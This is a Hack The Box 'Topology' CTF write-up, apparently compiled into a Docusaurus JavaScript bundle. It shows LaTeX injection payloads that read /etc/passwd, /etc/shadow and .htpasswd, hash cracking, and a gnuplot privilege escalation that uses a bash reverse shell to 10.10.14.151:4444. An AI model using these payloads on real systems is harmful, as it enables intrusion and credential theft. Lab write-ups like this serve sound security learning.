"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[8013],{3754:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>r,default:()=>h,frontMatter:()=>o,metadata:()=>l,toc:()=>c});var i=t(5893),s=t(1151);const o={slug:"/write-up/htb/easy/topology",pagination_next:null,pagination_prev:null},r=void 0,l={id:"Hacking/Write-ups/Hack the box/easy/Topology/Topology",title:"Topology",description:"Enumeration",source:"@site/docs/Hacking/Write-ups/Hack the box/easy/Topology/Topology.md",sourceDirName:"Hacking/Write-ups/Hack the box/easy/Topology",slug:"/write-up/htb/easy/topology",permalink:"/docs/write-up/htb/easy/topology",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/write-up/htb/easy/topology",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},a={},c=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,i.jsx)(n.p,{children:"Port 80 and 22 open"}),"\n",(0,i.jsx)(n.p,{children:"22"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.p,{children:"80"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Miskatonic University | Topology Group\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Browsing the website, found this subdomain: ",(0,i.jsx)(n.a,{href:"http://latex.topology.htb/equation.php",children:"http://latex.topology.htb/equation.php"}),", it contains a form where you input Latex commands and a mechanism behind that generates a ",(0,i.jsx)(n.code,{children:"png"}),"."]}),"\n",(0,i.jsx)(n.p,{children:"Let's search for more subdomains with gobuster:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'./gobuster vhost -u 10.10.11.217 -k --domain "topology.htb" --append-domain -w ~/workspace/gal/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \n'})}),"\n",(0,i.jsx)(n.p,{children:"Found subdomains:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"dev.topology.htb"}),"\n",(0,i.jsx)(n.li,{children:"stats.topology.htb"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Most likely, the service works by writing the provided equation to a file, then invoke a command to pass from tex to png"}),"\n",(0,i.jsx)(n.p,{children:"In a log file we can see the following:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"This is pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) (preloaded format=pdflatex 2022.2.15)  12 MAR 2022 08:48\n"})}),"\n",(0,i.jsx)(n.p,{children:"We see that we can inject commands in Latex, however there are some prohibitions in place:"}),"\n",(0,i.jsx)(n.p,{children:"Prohibited commands:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"\\input"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"\\include"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"\\verbatiminput"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"\\write\\outfile{Hello-world}"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"\\immediate\\write18{id > output}"})}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,i.jsx)(n.p,{children:"This payload works but only returns the first line:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\\newread\\file\n\\openin\\file=/etc/passwd\n\\read\\file to\\line\n\\text{\\line}\n\\closein\\file\n"})}),"\n",(0,i.jsx)(n.p,{children:"There's another option to read files:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-tex",children:"$\\lstinputlisting{/etc/passwd}$\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Here we can see the user ",(0,i.jsx)(n.code,{children:"vdaisley"}),"."]}),"\n",(0,i.jsxs)(n.p,{children:["Knowing that we have scanned the vhost and found dev and see some ",(0,i.jsx)(n.code,{children:".htaccess"})," and ",(0,i.jsx)(n.code,{children:".htpasswd"}),", now we can download them with the previous discovered reading method."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-tex",children:'$\\lstinputlisting{"/var/www/dev/.htpasswd"}$\n$\\lstinputlisting{"/etc/shadow"}$\n'})}),"\n",(0,i.jsx)(n.p,{children:"it will download the PNG image with the file contents, the password stored is a MD5 hash, which we can extract using tesseract:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"tesseract exfil/equation.png exfil/equation.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:"Then crack the hash using hashcat:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"hashcat hash.txt ~/workspace/SecLists/Passwords/Leaked-Databases/rockyou.txt\n"})}),"\n",(0,i.jsxs)(n.p,{children:["This will return the password for user ",(0,i.jsx)(n.code,{children:"vdaisley"}),", now you can SSH into the machine and get permanent access."]}),"\n",(0,i.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,i.jsxs)(n.p,{children:["In /opt we can find the ",(0,i.jsx)(n.code,{children:"gnuplot"})," binary owned by root but with write and execution permissions for the user."]}),"\n",(0,i.jsx)(n.p,{children:"This binary is used to generate the images. We can try to see if it's execute by running ps aux multiple times."}),"\n",(0,i.jsxs)(n.p,{children:["If we don't see any result, it means the process is executed by another user. But don't worry, we can use ",(0,i.jsx)(n.a,{href:"https://github.com/DominicBreuker/pspy",children:"pspy"})," to monitor processes not belonging to our user."]}),"\n",(0,i.jsx)(n.p,{children:"And there we see root is executing the following command"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"2023/06/13 16:33:01 CMD: UID=0     PID=1419   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; \n"})}),"\n",(0,i.jsxs)(n.p,{children:["So basically, gnuplot will execute any ",(0,i.jsx)(n.code,{children:"plt"})," file found in /opt/gnuplot."]}),"\n",(0,i.jsx)(n.p,{children:"Now what we can do is to create a plt file that will start a reverse shell with the user root."}),"\n",(0,i.jsx)(n.p,{children:"e.g"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"system \"bash -c 'bash -i >& /dev/tcp/10.10.14.151/4444 0>&1'\"\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Once the connection is established, we'll have ",(0,i.jsx)(n.code,{children:"root"})," access in the console and we can read the flag."]})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},1151:(e,n,t)=>{t.d(n,{Z:()=>l,a:()=>r});var i=t(7294);const s={},o=i.createContext(s);function r(e){const n=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),i.createElement(o.Provider,{value:n},e.children)}}}]);